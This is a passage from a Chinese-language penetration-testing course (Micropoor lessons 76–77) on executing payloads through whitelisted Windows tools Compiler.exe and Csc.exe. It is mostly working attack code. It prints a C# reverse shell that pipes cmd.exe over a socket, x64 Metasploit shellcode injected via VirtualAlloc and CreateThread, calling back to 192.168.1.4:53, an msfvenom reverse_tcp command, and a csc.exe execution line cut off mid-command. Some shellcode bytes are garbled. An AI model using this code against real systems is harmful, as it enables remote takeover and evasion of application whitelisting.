36.
37. {
38.
39. streamWriter=newStreamWriter(stream);
40.
第七十六课：基于白名单Compiler.exe执行payload第六季
-494-
本文档使用书栈(BookStack.CN)构建
41. StringBuilderstrInput=newStringBuilder();
42.
43. Processp=newProcess();
44.
45. p.StartInfo.FileName="cmd.exe";
46.
47. p.StartInfo.CreateNoWindow=true;
48.
49. p.StartInfo.UseShellExecute=false;
50.
51. p.StartInfo.RedirectStandardOutput=true;
52.
53. p.StartInfo.RedirectStandardInput=true;
54.
55. p.StartInfo.RedirectStandardError=true;
56.
57. p.OutputDataReceived+=newDataReceivedEventHandler(CmdOutputDataHandler);
58.
59. p.Start();
60.
61. p.BeginOutputReadLine();
62.
63. while(true)
64.
65. {
66.
67. strInput.Append(rdr.ReadLine());
68.
69. p.StandardInput.WriteLine(strInput);
70.
71. strInput.Remove(0,strInput.Length);
72.
73. }
74.
75. }
76.
77. }
78.
79. }
80.
81. }
82.
第七十六课：基于白名单Compiler.exe执行payload第六季
-495-
本文档使用书栈(BookStack.CN)构建
83. privatestaticvoidCmdOutputDataHandler(objectsendingProcess,
DataReceivedEventArgsoutLine)
84.
85. {
86.
87. StringBuilderstrOutput=newStringBuilder();
88.
89. if(!String.IsNullOrEmpty(outLine.Data))
90.
91. {
92.
93. try
94.
95. {
96.
97. strOutput.Append(outLine.Data);
98.
99. streamWriter.WriteLine(strOutput);
100.
101. streamWriter.Flush();
102.
103. }
104.
105. catch(Exceptionerr){}
106.
107. }
108.
109. }
110.
111. }
注：x64payload
1. usingSystem;
2.
3. usingSystem.Workflow.Activities;
4.
5. usingSystem.Net;
6.
7. usingSystem.Net.Sockets;
Micropoor_rev1.cs：
第七十六课：基于白名单Compiler.exe执行payload第六季
-496-
本文档使用书栈(BookStack.CN)构建
8.
9. usingSystem.Runtime.InteropServices;
10.
11. usingSystem.Threading;
12.
13. classyrDaTlg:SequentialWorkflowActivity{
14.
15. [DllImport("kernel32")]privatestaticexternIntPtrVirtualAlloc(UInt32
rCfMkmxRSAakg,UInt32qjRsrljIMB,UInt32peXiTuE,UInt32AkpADfOOAVBZ);
16.
17. [DllImport("kernel32")]publicstaticexternboolVirtualProtect(IntPt
rDStOGXQMMkP,uintCzzIpcuQppQSTBJ,uintJCFImGhkRqtwANx,outuintexgVpSg);
18.
19. [DllImport("kernel32")]privatestaticexternIntPtrCreateThread(UInt32
eisuQbXKYbAvA,UInt32WQATOZaFz,IntPtrAEGJQOn,IntPtrSYcfyeeSgPl,UInt32
ZSheqBwKtDf,refUInt32SZtdSB);
20.
21. [DllImport("kernel32")]privatestaticexternUInt32WaitForSingleObject(IntPtr
KqJNFlHpsKOV,UInt32EYBOArlCLAM);
22.
23. publicyrDaTlg(){
24.
25. byte[]QWKpWKhcs=
26.
27. {0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
28.
29. 0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,x48,
30.
31. 0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,xc9,
32.
33. 0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,x41,
34.
35. 0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,x48,
36.
37. 0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,x8b,
38.
39. 0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,x8b,
40.
41. 0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,x41,
42.
43. 0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,xc1,
44.
第七十六课：基于白名单Compiler.exe执行payload第六季
-497-
本文档使用书栈(BookStack.CN)构建
45. 0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,x45,
46.
47. 0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,x8b,
48.
49. 0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,x01,
50.
51. 0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,x48,
52.
53. 0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,xe9,
54.
55. 0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,x00,
56.
57. 0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,xe5,
58.
59. 0x49,0xbc,0x02,0x00,0x00,0x35,0xc0,0xa8,0x01,0x04,0x41,0x54,0x49,0x89,xe4,
60.
61. 0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,x68,
62.
63. 0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,x0a,
64.
65. 0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,x89,
66.
67. 0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,xd5,
68.
69. 0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,xba,
70.
71. 0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,0xce,0x75,xe5,
72.
73. 0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,xc9,
74.
75. 0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,xd5,
76.
77. 0x83,0xf8,0x00,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,x41,
78.
79. 0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,x41,
80.
81. 0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,x31,
82.
83. 0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,xc8,
84.
85. 0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,x40,
86.
第七十六课：基于白名单Compiler.exe执行payload第六季
-498-
本文档使用书栈(BookStack.CN)构建
87. 0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,0x30,0xff,xd5,
88.
89. 0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,x3c,
90.
91. 0xff,0xff,0xff,0x48,0x01,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,x41,
92.
93. 0xff,0xe7,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,xd5};
94.
95. IntPtrAmnGaO=VirtualAlloc(0,(UInt32)QWKpWKhcs.Length,0x3000,0x04);
96.
97. Marshal.Copy(QWKpWKhcs,0,(IntPtr)(AmnGaO),QWKpWKhcs.Length);
98.
99. IntPtroXmoNUYvivZlXj=IntPtr.Zero;UInt32XVXTOi=0;IntPtrpAeCTfwBS=
IntPtr.Zero;
100.
101. uintBnhanUiUJaetgy;
102.
103. booliSdNUQK=VirtualProtect(AmnGaO,(uint)0x1000,(uint)0x20,out
BnhanUiUJaetgy);
104.
105. oXmoNUYvivZlXj=CreateThread(0,0,AmnGaO,pAeCTfwBS,0,refXVXTOi);
106.
107. WaitForSingleObject(oXmoNUYvivZlXj,0xFFFFFFFF);}
108.
109. }
Micropoor
第七十六课：基于白名单Compiler.exe执行payload第六季
-499-
本文档使用书栈(BookStack.CN)构建
注：请多喝点热水或者凉白开，身体特别重要。
C#的在Windows平台下的编译器名称是Csc.exe，如果你的.NETFrameWorkSDK安装在C盘，那么
你可以在C:\WINNT\Microsoft.NET\Framework\xxxxx目录中发现它。为了使用方便，你可以手
动把这个目录添加到Path环境变量中去。用Csc.exe编译HelloWorld.cs非常简单，打开命令提示
符，并切换到存放
test.cs文件的目录中，输入下列行命令: csc/target:exetest.cs 将Ttest.cs编译成名为
test.exe的console应用程序
说明：Csc.exe所在路径没有被系统添加PATH环境变量中，因此，csc命令无法识别。
Windows7默认位置：
1. C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe
2. C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe
攻击机：192.168.1.4Debian
靶机：192.168.1.5Windows7
Csc.exe简介：
基于白名单Csc.exe配置payload：
配置攻击机msf：
第七十七课：基于白名单Csc.exe执行payload第七季
-500-
本文档使用书栈(BookStack.CN)构建
1. msfvenom‐pwindows/x64/shell/reverse_tcpLHOST=192.168.1.4LPORT=53‐fcsharp
配置payload：
第七十七课：基于白名单Csc.exe执行payload第七季
-501-
本文档使用书栈(BookStack.CN)构建
copybuf到Micropoor_Csc.csshellcode中。
靶机执行：
第七十七课：基于白名单Csc.exe执行payload第七季
-502-
本文档使用书栈(BookStack.CN)构建
1. C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe/r:System.Ente